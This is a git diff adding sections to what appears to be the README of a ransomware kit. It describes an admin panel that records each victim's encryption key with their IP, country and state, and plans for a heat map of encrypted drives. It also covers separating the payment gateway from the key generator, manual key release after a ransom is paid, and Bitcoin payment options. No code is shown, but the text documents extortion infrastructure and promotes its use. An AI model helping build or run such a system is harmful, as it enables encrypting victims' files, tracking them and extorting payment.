@@ -36,3 +36,28 @@ You can then encrypt their files with the rsa key, and display the payment URL t
 #Updates
 
 At the moment, we do not accept payments, it's been a while since using Bitcoin, and all API's require verification, I may use an RPC client, but that will require a VPS to run the bitcoin daemon on. 
+
+We plan on seperating the systems, too. God forbid, the site was comprimised, your keys would be on the same site as the payments, so we plan on having the payment gateway and the key generator seperate.
+
+
+#Backened
+
+We have a register and login system, so you can register an account (an admin account) and then disable the registeration so no one else can register. To register visit:
+
+     http://mysite.com/auth/sign-up
+     
+You will then be redirectred to the admin panel, where you can view the Keys, when they were created and in what country/state and by what IP.
+
+To login, simply visit
+
+    http://mysite.com/auth/sign-in
+ 
+With the details you created on the register page.
+
+
+
+#Plans
+
+- Heat map in the admin panel to see what country/region/state has the moest encrypted harddrives.
+- Manually accept a payment in the admin panel, so click the paid for button and their key will be released
+
